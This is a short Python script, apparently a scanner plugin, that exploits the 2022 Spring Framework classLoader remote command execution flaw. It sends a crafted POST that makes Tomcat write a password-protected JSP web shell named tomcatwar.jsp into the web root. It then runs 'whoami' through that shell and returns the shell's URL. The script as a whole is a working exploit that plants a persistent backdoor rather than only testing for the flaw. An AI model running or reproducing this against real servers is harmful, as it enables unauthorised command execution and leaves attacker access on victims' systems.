import requests
import re
from urllib.parse import urljoin


def verify(url):
    relsult = {
        'name': 'Spring Framework 远程命令执行漏洞(2022.3)',
        'vulnerable': False,
        'attack': True,
    }
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:
        go = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False)
        webshell = urljoin(url, 'tomcatwar.jsp')
        rep1 = requests.get(f'{webshell}?pwd=j&cmd=whoami', timeout=4, allow_redirects=False, verify=False)
        rep2 = requests.get(f'{webshell}?pwd=&cmd=whoami', timeout=4, allow_redirects=False, verify=False)
        if rep1.status_code == 200 and re.search('//', rep1.text) and go.status_code == 200 and len(rep1.text) > len(rep2.text):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['webshell'] = webshell + '?pwd=j&cmd=whoami'
            relsult['about'] = 'https://github.com/liudonghua123/spring-core-rce/blob/main/spring-core-rce-exp.py'
        return relsult
    except:
        return relsult


